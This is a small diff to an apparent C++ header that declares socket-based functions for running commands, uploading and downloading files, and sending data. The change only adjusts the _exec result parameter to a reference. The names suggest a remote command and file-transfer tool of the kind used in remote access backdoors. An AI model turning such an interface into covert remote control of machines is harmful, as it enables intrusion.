@@ -145,7 +145,7 @@ int EXEC(SOCKET socket_descriptor, char* cmd);
 int DOWNLOAD(SOCKET socket_descriptor, char* cmd);
 int SIZE_(SOCKET socket_descriptor, char* path, bool end=0);
 int UPLOAD(SOCKET socket_descriptor, char* cmd);
-int _exec(const char* cmd, char* result, int &_resultLen);
+int _exec(const char* cmd, char*& result, int &_resultLen);
 
 // send-recv Wrapper
 void SendAll(SOCKET soc, const char* str, unsigned long long bufferMaxLen);
